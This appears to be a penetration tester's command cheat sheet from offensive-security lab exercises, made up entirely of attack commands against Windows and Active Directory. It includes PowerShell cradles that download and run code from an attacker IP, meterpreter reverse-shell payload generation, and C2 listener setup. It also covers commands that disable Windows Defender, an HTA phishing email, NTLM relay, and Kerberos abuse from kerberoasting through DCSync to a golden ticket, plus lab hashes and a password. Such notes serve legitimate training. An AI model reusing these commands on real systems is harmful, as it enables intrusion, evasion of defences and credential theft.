xfreerdp /v:192.168.168.100 /u:administrator /p:lab /clipboard /drive:share,/home/kali/

(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244:80/am.txt') | IEX

msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.45.238 lport=443 exitfunc=thread -e x86/shikata_ga_nai -i 10 -f raw -o run.txt

msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<Your IP> LPORT=<Your Port> -e x64/xor -i 10 -f raw -o shellcode.bin

$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.244/am.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1) {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2) {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3) {
        $output += $thischar
    }
}

$output | clip

certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt

"cmd /c bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe"


profiles new -b  https://192.168.45.244:443 --format shellcode --arch amd64 local

https -L 192.168.45.244 -l 443 -c /home/kali/crt.crt -k /home/kali/key.key

stage-listener --url https://192.168.45.244:8080 --profile osep -c /home/kali/crt.crt -k /home/kali/key.key -C deflate9 --aes-encrypt-key 'D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT' --aes-encrypt-iv '8y/B?E(G+KbPeShV'

certutil -encode benign.exe file.txt

mtls -L 192.168.45.244 -l 443
upload /path/to/new_user_implant implant.exe
runas -d client -u administrator -P ,74Y)YZsjO6%t& -p cmd.exe -a '/c c:\users\ted\desktop\templantex.exe'

execute C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
execute C:\\Windows\\System32\\cmd.exe '/c net stop WinDefend'

powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
net stop WinDefend
sc config WinDefend start= disabled

rubeus dump /nowrap

delegationbof

mpacket-mssqlclient -hashes 00000000000000000000000000000000:c563b0d9b9e31f859baf10af22af0c62 administrator:@192.168.217.140 -windows-auth
XEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL27
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL27

$command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244:80/am.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand
xp_cmdshell ''powershell -encodedcommand KABOAGUAdw''

gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
gcc -o project1.elf linux_stager.c

msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -o challenge3.elf

swaks --body 'http://192.168.45.244/pizza.hta' --add-header "Really: 1.0" --add-header "Content-Type: text/html" --header "Subject: Important" -t will@tricky.com -f jim@tricky.com --server 192.168.186.159

impacket-smbserver myshare /home

rubeus -i kerberoast /nowrap

sqlrecon /auth:wintoken /h:sql07 /module:smb /rhost:\\\\192.168.45.244\\somewhere

sudo impacket-ntlmrelayx --no-http-server -smb2support -t 127.0.0.1:448 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIANAA0ADoAOAAwAC8AYQBtAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

portfwd add -b 127.0.0.1:448 -r 172.16.186.151:445

rubeus klist

rubeus --in-process ptt /ticket:

SpoolSample.exe DC01 FILES01

rubeus --in-process -t 15 monitor /interval:5 /nowrap

mimikatz lsadump::secrets

sharpview Add-DomainGroupMember -Identity "domain admins" -Members SQLSvc
sharpview Add-DomainObjectAcl -TargetIdentity "server admins" -PrincipalIdentity sqlsvc -Domain tricky.com -Rights All

sudo apt install krb5-user
* dont forget to forward port 88
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
impacket-psexec -k -no-pass 'complyedge.com/pete'@dmzdc01.complyedge.com
lsadump::dcsync /domain:complyedge.com /user:jim
.\sharphound.exe collectionmethod all


rubeus -- asktgt /user:FILE06$ /ntlm:4d5be97087535f3ba9c3a2d4d6524c3e /nowrap

rubeus --in-process s4u /impersonateuser:administrator /domain:jump09.ops.comply.com /msdsspn:cifs/JUMP09.OPS.COMPLY.COM /ticket:doIE9DCCBPC /ptt /dc:172.16.221.165

generice write/write-all from computer account:
proxychains impacket-rbcd -action write -delegate-to "JUMP09$" -delegate-from "FILE06$" ops.comply.com/file06\$ -hashes :4d5be97087535f3ba9c3a2d4d6524c3e -dc-ip 172.16.221.165

.\rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/JUMP09.OPS.COMPLY.COM /user:FILE06$ /ticket:doIE9DCCBPCgAwIBt /nowrap

proxychains impacket-psexec -k -target-ip 172.16.221.167 -dc-ip 172.16.221.165  jump09.ops.comply.com

proxychains impacket-getST -spn cifs/jump09.ops.comply.com ops.comply.com/file06\$ -impersonate Administrator -dc-ip 172.16.221.165 -hashes :4d5be97087535f3ba9c3a2d4d6524c3e

export KRB5CCNAME=./Administrator.ccache

lsadump::dcsync /user:ops\krbtgt
import-module .\powerview.ps1
get-domainSID
Get-DomainGroup -Domain comply.com -Identity "Enterprise Admins" | select distinguishedname,objectsid
get-domaintrust
kerberos::golden /user:orange418 /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt
